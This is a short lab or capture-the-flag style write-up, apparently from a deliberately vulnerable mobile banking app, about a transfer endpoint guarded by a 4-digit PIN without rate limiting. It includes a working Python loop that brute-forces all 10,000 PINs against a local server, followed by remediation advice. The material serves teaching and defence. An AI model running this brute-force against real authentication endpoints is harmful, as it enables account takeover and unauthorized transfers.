# 04 — Brute-forceable transaction PIN

**Category:** Authentication · **MASVS-AUTH-3** · **Difficulty:** medium

## The flaw
`POST /api/transfer` authorizes a transfer with a 4-digit PIN and applies **no
rate limiting, lockout, or backoff**. The entire keyspace is 10,000 values —
trivially brute-forced.

## Exploit
```python
import json, urllib.request
for pin in range(10000):
    body = json.dumps({"pin": f"{pin:04d}"}).encode()
    req = urllib.request.Request("http://127.0.0.1:8000/api/transfer", data=body)
    try:
        print(urllib.request.urlopen(req).read()); break   # 200 => flag
    except urllib.error.HTTPError:
        continue
```

## Fix
Rate-limit and lock out after a few failures, add exponential backoff, prefer
longer secrets / device-bound keys, and require step-up auth (biometric /
server-side OTP) for sensitive actions. Short numeric PINs need server-enforced
attempt limits to mean anything.
